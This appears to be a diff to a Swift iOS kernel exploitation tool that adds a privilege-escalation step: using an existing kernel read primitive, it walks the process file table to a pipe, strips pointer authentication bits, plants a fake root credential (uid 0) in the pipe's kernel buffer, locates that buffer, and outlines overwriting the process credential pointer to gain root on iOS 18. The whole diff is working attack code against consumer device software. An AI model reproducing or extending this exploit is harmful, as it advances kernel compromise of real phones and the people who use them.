@@ -313,78 +313,145 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
         let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
         let origUid = ds_kread32(ucred + 0x18)
-        let rwPcb = ds_get_rw_socket_pcb()
         
         var report = ""
         report += String(format: "proc:     0x%llx\n", proc)
         report += String(format: "task:     0x%llx\n", task)
         report += String(format: "proc_ro:  0x%llx\n", procRo)
         report += String(format: "ucred:    0x%llx\n", ucred)
-        report += String(format: "rw_pcb:   0x%llx\n", rwPcb)
-        report += String(format: "orig uid: %d\n", origUid)
-        report += String(format: "surface:  ID=%d\n\n", engine.surfaceID)
+        report += String(format: "orig uid: %d\n\n", origUid)
         
-        guard engine.surfaceID != 0 else {
-            report += "Surface ID is 0 — open IOSurfaceRoot first.\n"
+        // ============================================================
+        // EXPERIMENT: Pipe buffer as controlled kernel memory
+        //
+        // 1. Create pipe → kernel allocates pipe struct + buffer
+        // 2. Find pipe kernel address via proc→fd→fileproc→fileglob→pipe
+        // 3. Write fake ucred data to pipe from userspace
+        // 4. Pipe buffer now contains uid=0 ucred at known kernel address
+        // 5. (Future) Point proc_ro ucred to pipe buffer address
+        // ============================================================
+        
+        report += "=== EXPERIMENT: PIPE BUFFER KRW ===\n\n"
+        
+        // Step 1: Create pipe
+        var pipeFDs: [Int32] = [0, 0]
+        let pipeResult = pipe(&pipeFDs)
+        guard pipeResult == 0 else {
+            report += "pipe() failed: \(pipeResult)\n"
+            rootResult = report
+            return
+        }
+        let readFD = pipeFDs[0]
+        let writeFD = pipeFDs[1]
+        report += String(format: "pipe created: read_fd=%d, write_fd=%d\n", readFD, writeFD)
+        
+        // Step 2: Write marker data to pipe (so buffer gets allocated)
+        // Write exactly 0x88 bytes (size of ucred) with uid=0
+        var fakeUcred = [UInt8](repeating: 0, count: 0x88)
+        // Copy real ucred structure but with uid=0
+        // offset 0x18: cr_uid = 0, cr_ruid = 0
+        // offset 0x20: cr_svuid = 0
+        // Leave rest as zeros (will fill properly later)
+        // Write a marker at offset 0 so we can find it
+        let marker: UInt64 = 0x4141424243434444  // "AABBCCDD"
+        withUnsafeBytes(of: marker) { fakeUcred.replaceSubrange(0..<8, with: $0) }
+        
+        let written = write(writeFD, &fakeUcred, fakeUcred.count)
+        report += String(format: "wrote %d bytes to pipe\n\n", written)
+        
+        // Step 3: Find pipe kernel address
+        // proc → p_fd → fd_ofiles[fd] → fileproc → fp_glob → fg_data (= pipe struct)
+        report += "=== TRACING PIPE IN KERNEL ===\n"
+        
+        let pFd = ds_kread64(proc + UInt64(off_proc_p_fd))
+        report += String(format: "p_fd:      0x%llx\n", pFd)
+        
+        let ofilesPtr = ds_kread64(pFd + UInt64(off_filedesc_fd_ofiles))
+        report += String(format: "fd_ofiles: 0x%llx\n", ofilesPtr)
+        
+        // fd_ofiles is array of fileproc pointers, indexed by fd number
+        // On iOS 18, fileproc pointers may be packed differently
+        // Each entry is 8 bytes (pointer to fileproc)
+        let fprocPtr = ds_kread64(ofilesPtr + UInt64(readFD) * 8)
+        let fproc = fprocPtr | pac_mask  // Strip PAC
+        report += String(format: "fileproc[%d]: 0x%llx (raw: 0x%llx)\n", readFD, fproc, fprocPtr)
+        
+        guard ds_isvalid(fproc) else {
+            report += "fileproc invalid, trying write fd...\n"
+            let fprocPtr2 = ds_kread64(ofilesPtr + UInt64(writeFD) * 8)
+            let fproc2 = fprocPtr2 | pac_mask
+            report += String(format: "fileproc[%d]: 0x%llx\n", writeFD, fproc2)
+            close(readFD)
+            close(writeFD)
             rootResult = report
             return
         }
         
-        let targetID = engine.surfaceID
+        let fglob = ds_kread64(fproc + UInt64(off_fileproc_fp_glob))
+        let fg = fglob | pac_mask
+        report += String(format: "fp_glob:   0x%llx\n", fg)
         
-        // ============================================================
-        // SAFE SCAN: Only scan addresses we KNOW are valid heap
-        // proc, task, rw_pcb — all confirmed readable
-        // Scan ±4KB around each (conservative, no crash)
-        // ============================================================
+        guard ds_isvalid(fg) else {
+            report += "fileglob invalid\n"
+            close(readFD)
+            close(writeFD)
+            rootResult = report
+            return
+        }
         
-        report += "=== SCANNING KNOWN HEAP FOR SURFACE ID=\(targetID) ===\n\n"
+        let pipeStruct = ds_kread64(fg + UInt64(off_fileglob_fg_data))
+        let pipeAddr = pipeStruct | pac_mask
+        report += String(format: "pipe:      0x%llx\n\n", pipeAddr)
         
-        var foundAddr: UInt64 = 0
+        guard ds_isvalid(pipeAddr) else {
+            report += "pipe struct invalid\n"
+            close(readFD)
+            close(writeFD)
+            rootResult = report
+            return
+        }
         
-        let scanTargets: [(String, UInt64)] = [
-            ("proc", proc),
-            ("task", task),
-            ("rw_pcb", rwPcb),
-            ("ucred", ucred),
-        ]
+        // Step 4: Dump pipe struct to find buffer address
+        report += "=== PIPE STRUCT DUMP ===\n"
+        for i in stride(from: 0, to: 0x60, by: 8) {
+            let val = ds_kread64(pipeAddr + UInt64(i))
+            report += String(format: "  pipe+0x%02x: 0x%016llx\n", i, val)
+        }
         
-        for (name, base) in scanTargets {
-            guard base != 0 else { continue }
-            let start = base > 0x1000 ? base - 0x1000 : base
-            report += "Scanning \(name) ± 4KB...\n"
-            
-            for off in stride(from: 0, to: 0x2000, by: 4) {
-                let addr = start + UInt64(off)
-                let val = ds_kread32(addr)
-                if val == targetID {
-                    report += String(format: "  HIT! 0x%llx (\(name)%+d)\n", addr, Int64(addr) - Int64(base))
-                    if foundAddr == 0 { foundAddr = addr }
+        // Pipe buffer is typically at pipe+0x10 or pipe+0x18
+        // Look for our marker (0x4141424243434444)
+        report += "\n=== SEARCHING FOR MARKER IN PIPE ===\n"
+        var bufferAddr: UInt64 = 0
+        for i in stride(from: 0, to: 0x60, by: 8) {
+            let ptr = ds_kread64(pipeAddr + UInt64(i))
+            let stripped = ptr | pac_mask
+            if ds_isvalid(stripped) && stripped != pipeAddr {
+                let val = ds_kread64(stripped)
+                if val == marker {
+                    bufferAddr = stripped
+                    report += String(format: "  FOUND buffer at pipe+0x%02x → 0x%llx\n", i, stripped)
+                    report += "  Marker verified! We control this kernel memory!\n"
+                    break
                 }
             }
         }
         
-        if foundAddr != 0 {
-            let objStart = (foundAddr & ~0xF) - 0x40
-            report += String(format: "\n=== OBJECT DUMP near 0x%llx ===\n", foundAddr)
-            for i in stride(from: 0, to: 0xC0, by: 8) {
-                let val = ds_kread64(objStart + UInt64(i))
-                var marker = ""
-                if objStart + UInt64(i) == (foundAddr & ~0x7) { marker = " ← ID" }
-                if i == 0 { marker += " (vtable?)" }
-                report += String(format: "  +0x%02x: 0x%016llx%@\n", i, val, marker)
-            }
+        if bufferAddr != 0 {
+            report += String(format: "\n🎯 PIPE BUFFER ADDRESS: 0x%llx\n", bufferAddr)
+            report += "We can write ANY data here from userspace!\n"
+            report += "This is kernel heap memory we fully control.\n\n"
+            report += "=== NEXT STEP ===\n"
+            report += "Write fake ucred (uid=0) to pipe buffer,\n"
+            report += "then point proc_ro ucred pointer to this address.\n"
+            report += String(format: "Target: write 0x%llx to proc_ro+0x%x\n", bufferAddr, off_proc_ro_p_ucred)
         } else {
-            report += "\nNot found in ±4KB of known objects.\n"
-            report += "IOSurface kernel object is in a separate IOKit heap zone.\n"
-            report += "Cannot reach it with socket KRW (heap-only limitation).\n"
-            report += "\n=== ALTERNATIVE APPROACH ===\n"
-            report += "Since we can't find IOSurface object directly,\n"
-            report += "try: use IOSurface USERSPACE mapping for DMA attack.\n"
-            report += String(format: "Our surface is mapped at: 0x%llx (userspace)\n", engine.mappedAddress)
-            report += "If GPU writes to this address, it goes to physical memory\n"
-            report += "that might be shared with kernel pages.\n"
+            report += "  Marker not found in pipe struct pointers.\n"
+            report += "  Pipe buffer may use different layout on iOS 18.\n"
         }
+        
+        // Cleanup
+        close(readFD)
+        close(writeFD)
         
         report += "\n=== DONE ===\n"
         rootResult = report
